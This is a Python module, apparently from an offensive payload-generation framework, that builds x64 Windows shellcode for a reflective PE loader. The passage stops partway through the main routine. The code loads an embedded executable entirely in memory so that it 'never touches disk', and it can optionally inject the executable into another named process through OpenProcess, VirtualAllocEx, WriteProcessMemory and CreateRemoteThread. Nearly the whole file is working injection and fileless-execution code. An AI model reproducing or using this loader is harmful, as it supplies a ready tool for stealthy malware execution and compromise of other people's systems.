import sys
import math
import ctypes
import struct

from sickle.common.lib.generic import extract
from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.programmer import builder
from sickle.common.lib.programmer import stubhub

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.windows import (
    winnt,
    ntdef,
    ws2def,
    tlhelp32,
    winternl,
)

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = f"Windows ({arch}) Reflective PE Loader"

    module = f"{platform}/{arch}/reflective_pe_loader"

    example_run = f"{sys.argv[0]} -p {module} EXE=/path/doom.exe -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)"]

    summary = ("Stageless Reflective PE Loader that takes an x64 binary and executes it in memory")

    description = ("This shellcode stub operates as an x64 Reflective PE Loader, taking a buffer"
                   " containing the contents of a PE file and loading it in memory, ultimately"
                   " executing it. Depending on how this stub is delivered the contents of the"
                   " PE will never touch disk.")

    arguments = {}

    arguments["EXE"] = {}
    arguments["EXE"]["optional"] = "no"
    arguments["EXE"]["description"] = "Executable to be loaded into memory and executed"

    advanced = {}

    advanced["EXITFUNC"] = {}
    advanced["EXITFUNC"]["optional"] = "yes"
    advanced["EXITFUNC"]["description"] = "Exit technique"

    advanced["EXITFUNC"]["options"] = { "terminate": "Terminates the process and all of its threads",
                                        "thread": "Exit as a thread",
                                        "process": "Exit as a process" }

    advanced["PROCESS"] = {}
    advanced["PROCESS"]["optional"] = "yes"
    advanced["PROCESS"]["description"] = "Process name to inject PE into"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.dependencies = {
            "Kernel32.dll": [
                "LoadLibraryA",
                "VirtualAllocEx",
                "GetProcAddress",
                "VirtualProtectEx",
                "CreateRemoteThread",
            ],
            "msvcrt.dll" : [
                "memset",
            ]
        }

        self.set_args()

        sc_args = builder.init_sc_args(self.dependencies)
        sc_args.update({
            "index"                         : 0x00,
            "wsaData"                       : 0x00,
            "sockaddr_name"                 : 0x00,
            "sockfd"                        : 0x00,
            "buffer"                        : 0x00,
            "pResponse"                     : 0x00,
            "hProcess"                      : 0x00,
            "pNtHeader"                     : 0x00,
            "lpvLoadedAddress"              : 0x00,
            "dwOffsetToBaseRelocationTable" : 0x00,
            "pHeaderSection"                : 0x00,
            "dwTableSize"                   : 0x00,
            "pBaseRelocationTable"          : 0x00,
            "dwBlockSize"                   : 0x00,
            "pwRelocEntry"                  : 0x00,
            "numEntries"                    : 0x00,
            "dwBlockIndex"                  : 0x00,
            "dwAddressOffset"               : 0x00,
            "lpvPreferableBase"             : 0x00,
            "dwImportsOffset"               : 0x00,
            "lpImportData"                  : 0x00,
            "szDllName"                     : 0x00,
            "hLibraryHandle"                : 0x00,
            "dwFThunk"                      : 0x00,
            "lpApiImport"                   : 0x00,
            "stWrittenBytes"                : 0x00,
            "lpSectionHeaderArray"          : 0x00,
            "dwSectionMappedSize"           : 0x00,
            "dwSectionProtection"           : 0x00,
            "dwSecIndex"                    : 0x00,
        })

        if self.process != None:
            sc_args.update({
                "ProcessEntry": ctypes.sizeof(tlhelp32._PROCESSENTRY32), 
                "hSnapshot"   : 0x00,
                "pid"         : 0x00,
            })

        self.stack_space = builder.calc_stack_space(sc_args)
        self.storage_offsets = builder.gen_offsets(sc_args)

        return

    def set_args(self):
        """Parse user arguments and set default settings where appropriate
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        argv_dict.update(modparser.argument_check(Shellcode.advanced, self.arg_list))
        if (argv_dict == None):
            exit(-1)

        self.exe_stager = extract.read_bytes_from_file(argv_dict["EXE"])
        if self.exe_stager == None:
            exit(-1)

        # If we are injecting into a remote process we will need different API's
        # than if we are injecting into the target process. So, we only resolve
        # API's that are important to a given technique.
        if "PROCESS" not in argv_dict.keys():
            self.process = None
            self.dependencies["Kernel32.dll"] += "WaitForSingleObject",
            self.dependencies["Kernel32.dll"] += "GetCurrentProcess",
            self.dependencies["msvcrt.dll"] += "memcpy",
        else:
            self.process = argv_dict["PROCESS"]
            self.dependencies["Kernel32.dll"] += "CreateToolhelp32Snapshot",
            self.dependencies["Kernel32.dll"] += "WriteProcessMemory",
            self.dependencies["Kernel32.dll"] += "Process32First",
            self.dependencies["Kernel32.dll"] += "Process32Next",
            self.dependencies["Kernel32.dll"] += "CloseHandle",
            self.dependencies["Kernel32.dll"] += "OpenProcess",

        # Set the EXITFUNC and update the necessary dependencies
        self.exit_func = ""
        if "EXITFUNC" not in argv_dict.keys():
            self.exit_func = None
        else:
            self.exit_func = argv_dict["EXITFUNC"]

        # Update the necessary dependencies
        if self.exit_func == "terminate":
            self.dependencies["Kernel32.dll"] += "TerminateProcess",
        elif self.exit_func == "thread":
            self.dependencies["ntdll.dll"] = "RtlExitUserThread",
        elif self.exit_func == "process":
            self.dependencies["Kernel32.dll"] += "ExitProcess",

        return 0

    def modify_section_perms(self):
        """Modify the permissions for each section in the PE file
        """

        stub = f"""
get_lpSectionHeaderArray:
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}
    mov r11d, [rdx]
    mov rdx, r11
    mov rcx, [rbp - {self.storage_offsets['pResponse']}]
    add rcx, rdx
    add rcx, {ctypes.sizeof(winnt._IMAGE_NT_HEADERS64)}
    mov [rbp - {self.storage_offsets['lpSectionHeaderArray']}], rcx

init_dwSecIndex:
    xor rax, rax
    mov [rbp - {self.storage_offsets['dwSecIndex']}], rax\n"""

        if self.process != None:
            stub += f"""
copy_section:
    mov rax, [rbp - {self.storage_offsets['dwSecIndex']}]
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    mov r11d, [rdx]
    xor r14, r14
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.PointerToRawData.offset}
    mov r14d, [rdx]
    xor r13, r13
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.SizeOfRawData.offset}
    mov r13d, [rdx]
    mov rcx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    add rcx, r11
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, r14

    xchg rcx, r9
    mov r8, rdx
    mov rdx, r9
    mov r9, r13
    lea r11, [rsp+0x28]
    mov [rsp+0x20], r11
    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
    mov rax, [rbp - {self.storage_offsets['WriteProcessMemory']}]
    call rax\n"""
        else:
            stub += f"""
copy_section:
    mov rax, [rbp - {self.storage_offsets['dwSecIndex']}]
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    mov r11d, [rdx]
    xor r14, r14
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.PointerToRawData.offset}
    mov r14d, [rdx]
    xor r13, r13
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.SizeOfRawData.offset}
    mov r13d, [rdx]
    mov rcx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    add rcx, r11
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, r14
    mov r8, r13
    mov rax, [rbp - {self.storage_offsets['memcpy']}]
    call rax\n"""

        stub += f"""
get_mapped_section_size:
    xor rax, rax
    mov [rbp - {self.storage_offsets['dwSectionMappedSize']}], rax
    mov rdx, [rbp - {self.storage_offsets['pNtHeader']}]
    add rdx, {winnt._IMAGE_NT_HEADERS64.FileHeader.offset}
    add rdx, {winnt._IMAGE_FILE_HEADER.NumberOfSections.offset}
    mov ax, [rdx]
    dec al
    mov rcx, [rbp - {self.storage_offsets['dwSecIndex']}]
    cmp rcx, rax
    jne next_section

last_section:
    xor rcx, rcx
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    mov ecx, [rdx]
    xor rdx, rdx
    mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
    add r11, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    mov edx, [r11 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfImage.offset}]
    sub rdx, rcx
    mov [rbp - {self.storage_offsets['dwSectionMappedSize']}], rdx
    jmp page_execute_read_write

next_section:
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {ctypes.sizeof(winnt._IMAGE_SECTION_HEADER)}
    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    mov r11d, [rdx]
    xor r12, r12
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    mov r12d, [rdx]
    sub r11, r12
    mov [rbp - {self.storage_offsets['dwSectionMappedSize']}], r11

page_execute_read_write:
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.Characteristics.offset}
    mov r11d, [rdx]
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_EXECUTE}
    jz page_execute_read
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_READ}
    jz page_execute_read
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_WRITE}
    jz page_execute_read
    mov r12, {winnt.PAGE_EXECUTE_READWRITE}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
    jmp change_perm

page_execute_read:
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_EXECUTE}
    jz page_execute_writecopy
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_READ}
    jz page_execute_writecopy
    mov r12, {winnt.PAGE_EXECUTE_READ}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
    jmp change_perm

page_execute_writecopy:
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_EXECUTE}
    jz page_readwrite
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_WRITE}
    jz page_readwrite
    mov r12, {winnt.PAGE_EXECUTE_WRITECOPY}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
    jmp change_perm

page_readwrite:
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_READ}
    jz page_execute
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_WRITE}
    jz page_execute
    mov r12, {winnt.PAGE_READWRITE}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
    jmp change_perm

page_execute:
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_EXECUTE}
    jz page_readonly
    mov r12, {winnt.PAGE_EXECUTE}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12

    jmp change_perm

page_readonly:
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_READ}
    jz page_writecopy
    mov r12, {winnt.PAGE_READONLY}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
    jmp change_perm

page_writecopy:
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_WRITE}
    jz page_noaccess
    mov r12, {winnt.PAGE_WRITECOPY}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
    jmp change_perm

page_noaccess:
    mov r12, {winnt.PAGE_NOACCESS}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12

change_perm:
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    mov r11d, [rdx]
    mov rdx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    add rdx, r11
    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
    mov r8, [rbp - {self.storage_offsets['dwSectionMappedSize']}]
    mov r9, [rbp - {self.storage_offsets['dwSectionProtection']}]
    sub rsp, 0x20
    lea r11, [rbp - {self.storage_offsets['buffer']}]
    mov [rsp+0x20], r11
    mov rax, [rbp - {self.storage_offsets['VirtualProtectEx']}]
    call rax
    add rsp, 0x20

check_next_section:
    mov rcx, [rbp - {self.storage_offsets['dwSecIndex']}]
    inc cl
    mov [rbp - {self.storage_offsets['dwSecIndex']}], rcx
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {ctypes.sizeof(winnt._IMAGE_SECTION_HEADER)}
    mov [rbp - {self.storage_offsets['lpSectionHeaderArray']}], rdx
    xor r9, r9
    mov r8, [rbp - {self.storage_offsets['pNtHeader']}]
    add r8, {winnt._IMAGE_NT_HEADERS64.FileHeader.offset}
    mov r9w, [r8 + {winnt._IMAGE_FILE_HEADER.NumberOfSections.offset}]
    cmp rcx, r9
    jl copy_section
        """

        return stub

    def write_headers(self):
        """Write the headers into the newly allocated region
        """

        if self.process != None:
            stub = f"""
copy_to_alloc:
    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
    
    mov rdx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    
    xor r9, r9
    mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
    add r11, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    mov r9d, [r11 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfHeaders.offset}]

    mov r8, [rbp - {self.storage_offsets['pResponse']}]

    lea r11, [rsp+0x28]
    mov [rsp+0x20], r11

    mov rax, [rbp - {self.storage_offsets['WriteProcessMemory']}]

    call rax\n"""
        else:
            stub = f"""
copy_to_alloc:
    xor r8, r8
    mov rax, [rbp - {self.storage_offsets['memcpy']}]
    mov rcx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
    add r11, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    mov r8d, [r11 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfHeaders.offset}]
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    call rax\n"""

        stub += f"""
change_permissions:
    xor rdx, rdx
    mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
    add r11, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    mov edx, [r11 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfHeaders.offset}]
    mov rax, [rbp - {self.storage_offsets['VirtualProtectEx']}]
    mov r8, rdx
    mov rdx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    mov r11, rsp
    add rsp, 0x28
    mov [rsp+0x20], r11
    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
    mov r9, {winnt.PAGE_READONLY}
    call rax
        """

        return stub

    def load_imports(self):
        """Load functions imported by the PE
        """

        stub = f"""
get_dwImportsOffset:
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['pNtHeader']}]
    add rdx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    add rdx, {winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
    mov rax, {winnt.IMAGE_DIRECTORY_ENTRY_IMPORT}
    imul rax,{ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
    add rdx, rax 
    xor rax, rax
    mov eax, [rdx]
    mov r11, rax
    mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
    call rva2offset
    mov [rbp - {self.storage_offsets['dwImportsOffset']}], rax

get_lpImportData:
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, rax
    mov [rbp - {self.storage_offsets['lpImportData']}], rdx

parse_imports:
    mov rdx, [rbp - {self.storage_offsets['lpImportData']}]

get_szDllName:
    xor r11, r11
    add rdx, {winnt._IMAGE_IMPORT_DESCRIPTOR.Name.offset}
    mov r11d, [rdx]
    cmp r11, 0x00
    je check_dll_done
    mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
    call rva2offset
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]

get_hLibraryHandle:
    add rdx, rax 
    mov rcx, rdx
    mov rax, [rbp - {self.storage_offsets['LoadLibraryA']}]
    call rax
    mov [rbp - {self.storage_offsets['hLibraryHandle']}], rax

get_dwFThunk:
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['lpImportData']}]
    add rdx, {winnt._IMAGE_IMPORT_DESCRIPTOR.FirstThunk.offset}
    mov r11d, [rdx]
    mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
    call rva2offset
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, rax
    mov [rbp - {self.storage_offsets['dwFThunk']}], rdx

get_lpApiImport:
    mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
    add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset}
    mov r11, [rdx]
    mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
    call rva2offset
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, rax
    mov [rbp - {self.storage_offsets['lpApiImport']}], rdx

get_lpApiAddress:
    add rdx, {winnt._IMAGE_IMPORT_BY_NAME.Name.offset}
    mov rcx, [rbp - {self.storage_offsets['hLibraryHandle']}]
    mov rax, [rbp - {self.storage_offsets['GetProcAddress']}]
    call rax

write_address:
    mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
    add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset}
    mov [rdx], rax

load_next_entry:
    mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
    add rdx, {ctypes.sizeof(ctypes.c_uint64)}
    mov [rbp - {self.storage_offsets['dwFThunk']}], rdx

check_next_done:
    mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
    add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset}
    mov rdx, [rdx]
    cmp rdx, 0x00
    jne get_lpApiImport

next_dll:
    mov rdx, [rbp - {self.storage_offsets['lpImportData']}]
    add rdx, {ctypes.sizeof(winnt._IMAGE_IMPORT_DESCRIPTOR)}
    mov [rbp - {self.storage_offsets['lpImportData']}], rdx

check_dll_done:
    xor r11, r11
    add rdx, {winnt._IMAGE_IMPORT_DESCRIPTOR.Name.offset}
    mov r11d, [rdx]
    cmp r11, 0x00
    jne parse_imports
        """

        return stub


    def rva_to_offset(self):
        """Converts the RVA to a physical location within the PE
        """

        stub = f"""
; RAX = rva2offset(PIMAGE_NT_HEADERS64 pNtHeader, // RCX => pNtHeader
;                  DWORD dwVA);                   // R11 => pNtHeader->OptionalHeader.DataDirectory[X].VirtualAddress
rva2offset:
    push rbp
    mov rbp, rsp
    sub rsp, 0x10
    mov [rbp - 0x08], rcx
    mov [rbp - 0x10], r11
    xor r9, r9
    mov r8, rcx
    add r8, {winnt._IMAGE_NT_HEADERS64.FileHeader.offset}
    mov r9w, [r8 + {winnt._IMAGE_FILE_HEADER.NumberOfSections.offset}]
    add rcx, {ctypes.sizeof(winnt._IMAGE_NT_HEADERS64)}
    mov [rbp - 0x08], rcx
    xor rdi, rdi
loop:
    mov rcx, [rbp - 0x08]
    xor rax, rax
    xor rbx, rbx
    mov rax, {ctypes.sizeof(winnt._IMAGE_SECTION_HEADER)}
    mul rdi
    add rcx, rax
    mov r8, rcx
    mov r12, r8
    add rcx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    add r8, {winnt._IMAGE_SECTION_HEADER.Misc.offset}
    mov eax, [rcx]
    cmp r11d, eax
    jge in_range
    jmp not_in_range
in_range:
    mov ebx, [r8]
    add ebx, eax
    cmp r11d, ebx
    jb calc_offset
not_in_range:
    inc rdi
    cmp rdi, r9
    jl loop
    jmp calc_offset
next_entry:
    jmp loop
calc_offset:
    xor rbx, rbx
    add r12, {winnt._IMAGE_SECTION_HEADER.PointerToRawData.offset}
    mov ebx, [r12]
    add ebx, r11d
    sub ebx, eax
    xor rax, rax
    mov eax, ebx
    leave
    ret
        """

        return stub

    def rebase_pe(self):
        """Rebase the PE to be loaded from memory
        """

        stub = f"""
change_ImageBase:
    mov r8, [rbp - {self.storage_offsets['pNtHeader']}]
    add r8, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    mov rcx, [rbp - {self.storage_offsets["lpvLoadedAddress"]}]
    mov rdx, [r8 + {winnt._IMAGE_OPTIONAL_HEADER64.ImageBase.offset}]
    mov [rbp - {self.storage_offsets["lpvPreferableBase"]}], rdx
    mov [r8 + {winnt._IMAGE_OPTIONAL_HEADER64.ImageBase.offset}], rcx


get_dwOffsetToBaseRelocationTable:
    xor rdx, rdx
    mov rdx, [rbp - {self.storage_offsets['pNtHeader']}]
    add rdx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    add rdx, {winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
    mov rax, {winnt.IMAGE_DIRECTORY_ENTRY_BASERELOC}
    imul rax, {ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
    add rdx, rax
    xor rax, rax
    mov eax, [rdx]
    mov r11, rax
    mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
    call rva2offset
    mov [rbp - {self.storage_offsets['dwOffsetToBaseRelocationTable']}], rax

get_dwTableSize:
    mov rdx, [rbp - {self.storage_offsets['pNtHeader']}]
    add rdx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    add rdx, {winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
    mov rax, {winnt.IMAGE_DIRECTORY_ENTRY_BASERELOC}
    imul rax, {ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
    add rdx, rax
    xor rcx, rcx
    mov ecx, [rdx + {winnt._IMAGE_DATA_DIRECTORY.Size.offset}]
    mov [rbp - {self.storage_offsets['dwTableSize']}], rcx

get_pBaseRelocationTable:
    mov rcx, [rbp - {self.storage_offsets['dwOffsetToBaseRelocationTable']}]
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, rcx
    mov [rbp - {self.storage_offsets['pBaseRelocationTable']}], rdx

get_dwBlockSize:
    xor rcx, rcx
    mov rdx, [rbp - {self.storage_offsets['pBaseRelocationTable']}]
    add rdx, {winnt._IMAGE_BASE_RELOCATION.SizeOfBlock.offset}
    mov cx, [rdx]
    mov [rbp - {self.storage_offsets['dwBlockSize']}], rcx

get_pwRelocEntry:
    mov rdx, [rbp - {self.storage_offsets['pBaseRelocationTable']}]
    add rdx, {ctypes.sizeof(winnt._IMAGE_BASE_RELOCATION)}
    mov [rbp - {self.storage_offsets['pwRelocEntry']}], rdx

get_numEntries:
    mov rax, [rbp - {self.storage_offsets['dwBlockSize']}]
    sub rax, {ctypes.sizeof(winnt._IMAGE_BASE_RELOCATION)}
    shr rax, 1
    imul rax, {ctypes.sizeof(ctypes.c_uint16)}
    mov [rbp - {self.storage_offsets['numEntries']}], rax
    xor rax, rax

process_entries:
    mov [rbp - {self.storage_offsets['dwBlockIndex']}], rax
get_wBlockType:
    xor rcx, rcx
    xor rbx, rbx
    mov rax, [rbp - {self.storage_offsets['dwBlockIndex']}]
    mov rdx, [rbp - {self.storage_offsets['pwRelocEntry']}]
    add rdx, rax

get_wBlockOffset:
    mov cx, [rdx]
    mov bx, cx
    shr rcx, 0x0C
    and bx, 0x0fff

check_x64:
    cmp rcx, {winnt.IMAGE_REL_BASED_DIR64}
    jne init_next_entry

get_dwAddressOffset:
    xor rax, rax
    mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
    mov r11, [rbp - {self.storage_offsets['pBaseRelocationTable']}]
    mov eax, [r11]
    add rax, rbx
    mov r11, rax
    call rva2offset
    mov r12, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    mov rbx, [rbp - {self.storage_offsets['lpvPreferableBase']}]
    mov rcx, [rbp - {self.storage_offsets['pResponse']}]
    add rcx, rax
    mov rax, rcx
    mov rcx, [rcx]
    sub [rax], rbx
    add [rax], r12

init_next_entry:
    mov rax, [rbp - {self.storage_offsets['dwBlockIndex']}]
    add rax, {ctypes.sizeof(ctypes.c_uint16)}
    mov [rbp - {self.storage_offsets['dwBlockIndex']}], rax
    mov rcx, [rbp - {self.storage_offsets['numEntries']}]
    cmp rax, rcx
    jl process_entries

no_reloc:
    mov rdx, [rbp - {self.storage_offsets['pBaseRelocationTable']}]
    mov rcx, [rbp - {self.storage_offsets['dwBlockSize']}]
    add rdx, rcx
    mov [rbp - {self.storage_offsets['pBaseRelocationTable']}], rdx
    mov rdx, [rbp - {self.storage_offsets['dwTableSize']}]
    sub rdx, rcx
    mov [rbp - {self.storage_offsets['dwTableSize']}], rdx
    cmp rdx, 0
    jg get_dwBlockSize
        """

        return stub

    def get_pid_of(self, target_proc):
        """Obtains the PID of a target process

        :param target_proc: The name of the target process to inject into
        :type target_proc: str
        """

        stub = f"""
take_snap:
    mov rcx, {tlhelp32.TH32CS_SNAPPROCESS}
    xor rdx, rdx
    mov rax, [rbp - {self.storage_offsets['CreateToolhelp32Snapshot']}]
    call rax
    mov [rbp - {self.storage_offsets['hSnapshot']}], rax

setup_PROCESSENTRY32:
    lea rbx, [rbp - {self.storage_offsets['ProcessEntry']}]
    mov rdi, rbx
    xor rax, rax
    mov rcx, {int(ctypes.sizeof(tlhelp32._PROCESSENTRY32)/8)}
    rep stosq

    mov dword ptr [rbx], {ctypes.sizeof(tlhelp32._PROCESSENTRY32)}

find_proc:
    mov rcx, [rbp - {self.storage_offsets['hSnapshot']}]
    lea rdx, [rbp - {self.storage_offsets['ProcessEntry']}]
    mov rax, [rbp - {self.storage_offsets['Process32First']}]
    call rax

check_proc:
    lea rdx, [rbp - {self.storage_offsets['ProcessEntry']}]
    add rdx, {tlhelp32._PROCESSENTRY32.szExeFile.offset}
    xor rcx, rcx

begin_check:"""

        for i in range(len(target_proc) - 1):
            stub += f"""
    mov cl, {hex(ord(target_proc[i]))}
    cmp [rdx + {i}], cl
    jne next_proc_entry"""

        stub += f"""
    cmp byte ptr [rdx + {len(target_proc) - 1}], {hex(ord(target_proc[len(target_proc)-1]))}
    je get_pid

next_proc_entry:
    mov rax, [rbp - {self.storage_offsets["Process32Next"]}]
    mov rcx, [rbp - {self.storage_offsets["hSnapshot"]}]
    lea rdx, [rbp - {self.storage_offsets["ProcessEntry"]}]
    mov dword ptr [rbx], {ctypes.sizeof(tlhelp32._PROCESSENTRY32)}
    call rax
    test rax, rax
    jnz check_proc

get_pid: 
    xor rax, rax
    lea rdx, [rbp - {self.storage_offsets['ProcessEntry']}]
    add rdx, {tlhelp32._PROCESSENTRY32.th32ProcessID.offset}
    mov eax, [rdx]
    mov [rbp - {self.storage_offsets['pid']}], rax

call_CloseHandle:
    mov rax, [rbp - {self.storage_offsets['CloseHandle']}]
    mov rcx, [rbp - {self.storage_offsets['hSnapshot']}]
    call rax
        """

        return stub

    def alloc_image_space(self):
        """Create the allocation where the PE will loaded
        """

        if (self.process != None):
            stub = self.get_pid_of(self.process)
            stub += f"""
call_OpenProcess:
    mov rax, [rbp - {self.storage_offsets['OpenProcess']}]
    mov rcx, {winnt.PROCESS_ALL_ACCESS}
    xor rdx, rdx
    mov r8, [rbp - {self.storage_offsets['pid']}]
    call rax
    mov [rbp - {self.storage_offsets['hProcess']}], rax\n"""
        else:
            stub = f"""
call_GetCurrentProcess:
    mov rax, [rbp - {self.storage_offsets['GetCurrentProcess']}]
    call rax
    mov [rbp - {self.storage_offsets['hProcess']}], rax\n"""

        stub += f"""
alloc_pe_home:
    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
    xor rdx, rdx
    mov r8, [rbp - {self.storage_offsets['pResponse']}]
    mov dx, [r8 + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
    mov r8, [rbp - {self.storage_offsets['pResponse']}] 
    add r8, rdx
    mov [rbp - {self.storage_offsets['pNtHeader']}], r8
    add r8, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    xor rdx, rdx
    mov edx, [r8 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfImage.offset}]
    mov r8, rdx
    mov r9, {winnt.PAGE_EXECUTE_READWRITE}
    mov [rsp + 0x20], r9
    xor r9, r9
    add r9, {winnt.MEM_COMMIT + winnt.MEM_RESERVE}
    xor rdx, rdx
    mov rax, [rbp - {self.storage_offsets['VirtualAllocEx']}]
    call rax
    mov [rbp - {self.storage_offsets['lpvLoadedAddress']}], rax
        """

        return stub

    def gen_main(self):
        """Returns bytecode generated by the keystone engine.
        """

        src = f"""
load_exe_file:
    lea rax, [rip + exe_file]
    mov [rbp - {self.storage_offsets['pResponse']}], rax
        """

        src += self.alloc_image_space()
        src += self.rebase_pe()
        src += self.load_imports()
        src += self.write_headers()
        src += self.modify_section_perms()

        src += f"""
call_CreateRemoteThread:
    xor r9, r9
    mov r8, [rbp - {self.storage_offsets['pNtHeader']}]
    add r8, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    mov r9d, [r8 + {winnt._IMAGE_OPTIONAL_HEADER64.AddressOfEntryPoint.offset}]

    mov rcx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    add rcx, r9
    mov r9, rcx
    xor rdx, rdx
    mov [rsp + 0x20], rdx
    mov [rsp + 0x28], rdx
    mov [rsp + 0x30], rdx
    xor r8, r8
    mov rax, [rbp - {self.storage_offsets['CreateRemoteThread']}]
    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
    call rax\n"""

        if self.process == None:
            src += f"""
call_WaitForSingleObject:
